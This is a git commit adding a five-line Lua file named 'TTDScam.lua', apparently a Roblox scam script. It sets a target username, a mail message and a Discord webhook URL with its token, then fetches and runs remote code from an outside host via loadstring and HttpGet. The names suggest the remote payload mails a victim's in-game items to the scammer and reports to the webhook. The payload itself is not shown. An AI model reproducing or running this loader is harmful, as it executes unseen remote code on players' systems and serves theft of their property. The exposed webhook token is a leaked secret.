e92ecfadf946f9aae06ae3239cdfe9bb4d2b2d11
WeAreCrews <119337925+WeAreCrews@users.noreply.github.com>
2024-06-19 13:29:35 +0300

    Create TTDScam.lua

---
+++ TTDScam.lua
@@ -0,0 +1,5 @@
+Username = "MEM4IK100320"
+MailMessage = "ggez"
+Webhook = "https://discord.com/api/webhooks/1252924977662132225/KmHeisjAZ0LL8f4-vUnoE9RYMxgCTafwKZUINaoYdWsadalmAyUAEUhlHMOlwr4KK-nw"
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
